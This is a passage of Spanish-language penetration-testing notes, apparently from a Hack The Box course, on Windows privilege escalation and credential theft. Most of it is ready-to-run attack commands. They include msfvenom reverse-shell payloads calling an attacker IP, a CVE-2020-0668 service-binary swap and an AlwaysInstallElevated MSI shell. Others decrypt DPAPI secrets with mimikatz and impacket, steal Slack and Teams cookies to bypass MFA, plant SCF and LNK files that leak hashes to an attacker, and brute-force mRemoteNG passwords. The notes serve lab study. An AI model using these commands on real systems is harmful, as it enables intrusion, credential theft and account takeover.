También podemos buscar cualquier software de terceros que se pueda aprovechar, como el Mozilla Maintenance Service (se ejecuta en el contexto de SYSTEM y puede ser iniciado por usuarios sin privilegios). El binario (no protegido por el sistema) de este servicio se encuentra a continuación. `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

.\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Necesitamos hacer dos copias del .exe malicioso ya que la primera se corrompe.

---------
# 6. Archivos con credenciales

En contra de las mejores prácticas, las aplicaciones a menudo almacenan contraseñas en archivos de configuración en texto plano (cleartext).

## 6.1. Buscar archivos

```bash
cd C:/Users/; findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml | findstr -v "C__WINDOWS_SystemApps Cortana Windows.Search_ InboxTemplates"

cd C://; findstr /S /I /M /C:"newuser" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

-------------
## 6.2. DPAPI

DPAPI son siglas de API de "protección de datos" y es un cojjunto de funciones del sistema que los programas (de windows y de terceros) usan para cifrar y descifrar datos por usuario. 

#### Descifrar DPAPI
Si nos encontramos enumerando que la masterkey de DPAPi está disponible, podremos crackear archivos
```bash
ls %UserProfile%\AppData\Roaming\Microsoft\Credentials # masterkey de DPAPI 🡆 772275FA...
ls %UserProfile%\AppData\Roaming\Microsoft\Protect\<SID> #  Archivo cifrado 🡆 0894938...

impacket-dpapi masterkey <masterkey> -file <archivo> -sid <sid> -password <pass> # Decrypted key 
impacket-dpapi credential -file <archivo> -key <clave>

# DonPapi o Nxc lo hacen de manera automática:
DonPAPI collect -u <usuario> -p <contraseña> -t 172.16.20.2 # Con PtH -H "<hash>"
nxc smb 172.16.20.2 -u administrator -p <contraseña> --dpapi
mimikatz 'dpapi::masterkey /in:.\masterkey /sid:<sid> /password:<pass>' 'exit'
mimikatz 'dpapi::cred /in:.\cred.txt'
```


#### Credential manager y vault
Para extraer credenciales del credential manager podemos usar 
```bash
cmd> cmdkey /list
# Target: Domain:interactive=SRV01\mcharles  🡆 credencial de dominio interactiva 🡆 runas
# Type: Domain Password 
# User: SRV01\mcharles
cmd> runas /savecred /user:SRV01\mcharles cmd
```

Puede que este usuario sea miembro de un grupo privilegiado.

Para extraer credenciales del vault y credential manager, debemos tener los privilegios activos y ejecutar mimikatz `vault::cred` y `sekurlsa::credman`

--------
#### Credenciales en scrips
Tenemos un archivo llamado `pass.xml` con la string `System.Management.Automation.PSCredential` (DPAPI) y abajo una contraseña cifrada. Entonces solo tenemos que poner estos comandos para descifrarla
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\> $credential.GetNetworkCredential().password
# Str0ng3ncryptedP@ss!
```


--------
#### Herramientas
Otras herramientas que podemos usar son: 
```bash
SharpChrome.exe logins /unprotect
Sharpup.exe audit
LaZagne all
SessionGopher
SharpDPAPI
```


------
## 6.2. Historial, winlogon y unattend
Podemos buscar en el historial:
```bash
powershell.exe -c "sls (Get-PSReadLineOption).HistorySavePath -Pattern '/p','pass'"
```

Es tambien muy famoso el `Unnatend.xml` o el `Autologon` o las credenciales de PuTTy
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultPassword"

reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

Contraseñas inalambricas
```
netsh wlan show profile
netsh wlan show profile ilfreight_corp key=clear
```

---
## 6.4. Otros formatos
Para bases de datos SQLite (como las de sticky notes):
```bash
# Buscar si hay
dir "%LOCALAPPDATA%\Packages\plum.sqlite" /s /b 2>nul

# Descifrarlo
Import-Module .\PSSQLite.psd1 
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes...\LocalState\plum.sqlite' 
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

O por archivos kdbx (keepass). Aunque podemos usar Snaffler en entornos DC
```bash
dir C:\*.kdbx  /s /b 2>nul
```

Para sniffar credenciales de una captura pcap podemos usar **[net-creds](https://github.com/DanMcInerney/net-creds)**

-------
# 7. Otros

## 7.1. SCF en un recurso compartido de archivos

Un archivo `scf` se usa por el Explorador de Windows para subir y bajar de directorios, mostrar el Escritorio, etc. Aun así puede ser manipulado para que la ubicación del archivo del icono apunte a nuestro servidor y hacer que el Explorador de Windows se autentique por SMB cuando se accede a la carpeta donde reside el archivo `.scf`. Luego se capturan los hashes con `Responder`

Esto puede ser particularmente útil si obtenemos acceso de escritura a un recurso compartido muy utilizado o incluso a un directorio en la estación de trabajo de un usuario. 

```bash
# Creamos @Inventory.scf, la @ hace que salga arriba del directorio
[Shell]
Command=2
IconFile=\\<ip_kali>\share\legit.ico
[Taskbar]
Command=ToggleDesktop

# A continuación, inicia Responder en nuestra máquina de ataque
sudo responder -w -v -I tun0
```

Hay que colocarlo en un directorio de habitual acceso, para ver sobre cuales tenemos permisos usamos accesschk.

## 7.2. Capturando hashes con un archivo .lnk malicioso

El uso de SCFs ya no funciona en hosts con Server 2019, pero podemos lograr el mismo efecto usando un archivo .lnk malicioso. Podemos usar varias herramientas para generar un archivo .lnk malicioso, como Lnkbomb, ya que no es tan sencillo como crear un archivo .scf malicioso. También podemos crear uno usando unas pocas líneas de PowerShell:

```bash
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```
Tambien esta la herramienta [lnkbomb](https://github.com/dievus/lnkbomb)

## 7.3. Software instalado

Vemos el software instalado
```
powershell "gp 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' | ? DisplayName | sort DisplayName -Unique | ft DisplayName,DisplayVersion,InstallLocation -AutoSize"
```

Vemos que está instalado `mRemoteNG` (una herramienta para conectarse a sistemas remotos con varios protoocolos). Guarda información y credenciales en el archivo  `%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml`.  

> [!NOTE]
> Este documento XML contiene un elemento raíz llamado `Connections` con la información sobre el cifrado utilizado para las credenciales y el atributo `Protected`, la contraseña maestra utilizada para cifrar el documento. Los elementos `Node` tienen información del sistema remoto, nombre de usuario, protocolo y la contraseña cifrada con la contraseña maestra.

Si el usuario no estableció una contraseña maestra personalizada, podemos usar el script [mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) para descifrar la contraseña. 
```bash
for pass in $(cat /usr/share/wordlists/rockyou.txt);do echo $password; python3 mremoteng_decrypt.py -s "<campo_password>" -p $pass 2>/dev/null;done
```

## 7.4. Robo de cookies

Las aplicaciones de mensajeria corporativa como `Slack` y `MS Teams` son una mina de oro de unformación. Para acceder a ellas:
- Utilizar las credenciales del usuario para acceder a la versión en la nube de la aplicación 
- Si usa MFA: robar las cookies 

Se pueden extraer las cookies desde Firefox con [cookieextractor](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py)  
```bash
copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
python3 cookieextractor.py --dbpath "./cookies.sqlite" --host slack --cookie d
```

O desde Chromium. usamos [Invoke-SharpChromium](https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1): ``
```
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
Invoke-SharpChromium -Command "cookies slack.com"
```

- Portapapeles: tenemos la herramienta [Invoke-Clipboard](https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1)

-------------
## 7.5. Servidores backup

Normalmente, los sistemas de copia de seguridad necesitan una cuenta con privilegios administrativos para conectarse a la máquina objetivo y realizar la copia de seguridad.

Por ejemplo el programa Restic, que usa la variable de entorno `RESTIC_PASSWORD` para almacenar la contraseña y un repositorio donde se inicializará y guardará la copia de seguridad:
```bash
mkdir E:\restic2; restic.exe -r E:\restic2 init
$env:RESTIC_PASSWORD = 'Password' 
restic.exe -r E:\restic2\ backup C:\xampp\htdocs\webapp

# Para system32 -> shadow copy VSS
restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

# Ver copias de seguridad
restic.exe -r E:\restic2\ snapshots
# b0b6f4bb 2022-08-09 14:19:41 PILLAGING-WIN01 C:\Windows\System32\config
restic.exe -r E:\restic2\ restore b0b6f4bb --target C:\Restore
```

## 7.5. AlwaysInstallElevated

Si estas dos claves del registro están a `1`, cualquier usuario puede instalar paquetes `.msi` con privilegios de **SYSTEM**, independientemente de sus permisos.
```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 1
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer → AlwaysInstallElevated = 1
```

Por tanto para el ataque
```bash
# 1. Verificamos las dos claves del registro, tanto bajo la raiz HCKU como la HKLM
reg query <raiz>\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 2. Luego generamos un payload MSI con msfvenom en kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<puerto> -f msi -o shell.msi

# 3. Y lo instalamos como usuario normal, pero se ejecutará como system 
msiexec /quiet /qn /i shell.msi
```


------------
## 7.6. Otros

#### Lolbas

El proyecto LOLBAS documenta binarios, scripts y librerías que pueden ser utilizados para técnicas de "living off the land" en sistemas Windows. Cada uno de estos binarios, scripts y librerías es un archivo firmado por Microsoft que es nativo del sistema operativo o puede ser descargado directamente desde Microsoft y tiene una funcionalidad inesperada útil para un atacante.

---------------
#### CVE-2019-1388
El ejecutable hhupd.exe tiene un hipervinculo vulnerable en el UAC

```
hhupd.exe 🡆 Ejecutar como administrator (UAC) 🡆 Mostrar información sobre el certificado del editor 🡆 General 🡆 Hipervinculo en "Emitido por" 🡆 Ver código fuente de la página 🡆 Guardar como 🡆 c:\windows\system32\cmd.exe
```

Microsoft lanzó un parche para este problema en noviembre de 2019

------------------
#### Tareas programadas
Podemos ver las tareas creadas por nuestro usuario y las tareas programadas predeterminadas del sistema, pero no de otros usuarios (`C:\Windows\System32\Tasks`)

```
Get-ScheduledTask | select TaskName,State | ? {$_.State -eq "Running"}
```

Nosotros (aunque rara vez) podemos encontrar una tarea programada que se ejecuta como administrador configurada con permisos débiles en archivos/carpetas por cualquier número de razones. En este caso, podríamos editar la tarea en sí para realizar una acción no intencionada o modificar un script ejecutado por la tarea programada.

Podemos usar el procmon o pspy para detectarlas

-----------
#### Descripciones con credenciales
Descripciones con credenciales (solemos verla en linux por `rpcclient`)
```bash
Get-LocalUser 
Get-WmiObject -Class Win32_OperatingSystem | select Description
```

-----------
#### Discos VHD/VHDX en Linux
Si encontramos archivos de discos, podemos tratar de montarlos

```bash
# VMD Y VHDX
linux: guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
Linux: guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

En Windows, podemos hacer clic derecho en el archivo y elegir Montar, o usar la utilidad Administración de discos para montar un archivo .vhd o .vhdx. Si se prefiere, podemos usar el cmdlet de PowerShell Mount-VHD.

-----------
#### Windows antiguos
Podemos usar [Sherlock](https://github.com/rasta-mouse/Sherlock) para buscar parches faltantes. También podemos usar algo como [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), que toma los resultados del comando `systeminfo`

```bash
Set-ExecutionPolicy bypass -Scope process; Import-Module .\Sherlock.ps1 
Find-AllVulns
# Title      : Task Scheduler .XML
# VulnStatus : Appears Vulnerable
# Enviar una consola
```

O exploit suggester
```bash
sudo python3 windows-exploit-suggester.py --update
python3 windows-exploit-suggester.py  --systeminfo sysinfo.txt 
```

# 8. 🔍 Enumeración inicial — ¿Por dónde empezar?

Herramientas automáticas de enumeración En lugar de lanzar los comandos uno a uno, estas herramientas automatizan toda la enumeración:
- **WinPEAS** — enumeración exhaustiva, colorea los hallazgos por criticidad
- **PowerUp** (PowerSploit) — enfocado en configuraciones incorrectas de servicios y privilegios
- **Seatbelt** — recopila información del sistema orientada a seguridad ofensiva
- **SharpUp** — versión de PowerUp compilada en C#

---

## 🔗 Ver también

- [[Windows; Procesos, redes y servicios]]
- [[Windows; gestión de identidades]]
- [[Windows; sistema de ficheros y permisos]]
- [[Windows; Configuraciones]]
- [[Active Directory]]
